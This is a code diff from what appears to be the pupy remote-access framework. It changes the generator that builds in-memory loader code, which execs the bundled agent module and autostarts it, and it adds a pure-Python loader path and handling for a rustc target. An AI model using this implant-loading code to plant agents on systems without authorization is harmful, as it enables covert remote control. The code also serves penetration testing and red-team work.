@@ -275,39 +275,76 @@ def safe_file_exists(f):
     return os.path.basename(f) in os.listdir(os.path.dirname(f))
 
 
+def dict2code(d):
+    """ convert a dict into its python code representation, that should be compatible with any python implementation """
+
+
 def bootstrap(stdlib, config, autostart=True):
-    actions = [
-        'from __future__ import absolute_import',
-        'from __future__ import division',
-        'from __future__ import print_function',
-        'from __future__ import unicode_literals',
+    if "pupy/agent/__init__.pyo" in stdlib:
+        actions = [
+            'from __future__ import absolute_import',
+            'from __future__ import division',
+            'from __future__ import print_function',
+            'from __future__ import unicode_literals',
 
-        'import importlib.util, sys, marshal',
+            'import importlib.util, sys, marshal',
 
-        'stdlib = marshal.loads({stdlib})',
-        'config = marshal.loads({config})',
-        'spec = importlib.util.spec_from_loader("pupy.agent", loader=None)',
-        'agent = importlib.util.module_from_spec(spec)',
-        'agent.__file__ = str("pupy://pupy/agent/__init__.pyo")',
-        'agent.__package__ = str("pupy.agent")',
-        'agent.__path__ = [str("pupy://pupy/agent/")]',
-        '#sys.modules[str("pupy.agent")] = agent',
+            'stdlib = marshal.loads({stdlib})',
+            'config = marshal.loads({config})',
+            'spec = importlib.util.spec_from_loader("pupy.agent", loader=None)',
+            'agent = importlib.util.module_from_spec(spec)',
+            'agent.__file__ = str("pupy://pupy/agent/__init__.pyo")',
+            'agent.__package__ = str("pupy.agent")',
+            'agent.__path__ = [str("pupy://pupy/agent/")]',
 
-        'exec(marshal.loads(stdlib["pupy/agent/__init__.pyo"][8:]), agent.__dict__)',
-    ]
+            'exec(marshal.loads(stdlib["pupy/agent/__init__.pyo"][8:]), agent.__dict__)',
+        ]
 
-    if autostart:
-        actions.append('agent.main(stdlib=stdlib, config=config)')
+        if autostart:
+            actions.append('agent.main(stdlib=stdlib, config=config)')
+        else:
+            actions.append('def main():')
+            actions.append('    agent.main(stdlib=stdlib, config=config)')
+
+        loader = '\n'.join(actions)
+
+        return loader.format(
+            stdlib=reprb(marshal.dumps(stdlib, 2)),
+            config=reprb(marshal.dumps(config, 2))
+        )
     else:
-        actions.append('def main():')
-        actions.append('    agent.main(stdlib=stdlib, config=config)')
+        # pure python version
+        actions = [
+            'from __future__ import absolute_import',
+            'from __future__ import division',
+            'from __future__ import print_function',
+            'from __future__ import unicode_literals',
 
-    loader = '\n'.join(actions)
+            'import importlib.util, sys',
 
-    return loader.format(
-        stdlib=reprb(marshal.dumps(stdlib, 2)),
-        config=reprb(marshal.dumps(config, 2))
-    )
+            'stdlib = {stdlib}',
+            'config = {config}',
+            'spec = importlib.util.spec_from_loader("pupy.agent", loader=None)',
+            'agent = importlib.util.module_from_spec(spec)',
+            'agent.__file__ = str("pupy://pupy/agent/__init__.py")',
+            'agent.__package__ = str("pupy.agent")',
+            'agent.__path__ = [str("pupy://pupy/agent/")]',
+
+            'exec(stdlib["pupy/agent/__init__.py"].decode("utf8"), agent.__dict__)',
+        ]
+
+        if autostart:
+            actions.append('agent.main(stdlib=stdlib, config=config)')
+        else:
+            actions.append('def main():')
+            actions.append('    agent.main(stdlib=stdlib, config=config)')
+
+        loader = '\n'.join(actions)
+
+        return loader.format(
+            stdlib=repr(stdlib),
+            config=repr(config)
+        )
 
 
 def importer(
@@ -895,10 +932,17 @@ def add_missing_init(target, modules):
         tab=k.split("/")
         for i in range(1, len(tab)-1):
             pathname="/".join(tab[0:i])
-            f=pathname+"/__init__.pyo"
-            if f not in modules and f not in toadd and f[:-1] not in modules:
-                logger.debug("adding missing {}".format(f))
-                toadd[f] = pupycompile("", pathname, target=target.pyver)
+            if not target.rustc:
+                f=pathname+"/__init__.pyo"
+                if f not in modules and f not in toadd and f[:-1] not in modules:
+                    logger.debug("adding missing {}".format(f))
+                    toadd[f] = pupycompile("", pathname, target=target.pyver)
+            else:
+                f=pathname+"/__init__.py"
+                if f not in modules and f not in toadd:
+                    logger.debug("adding missing {}".format(f))
+                    toadd[f] = b""
+
     modules.update(toadd)
 
 def bundle(target):
